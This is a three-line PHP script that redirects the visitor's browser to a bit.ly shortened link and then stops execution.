<?php
    header("Location: http://bit.ly/2OKaV2i"); /* Redirect browser */
    exit();
?>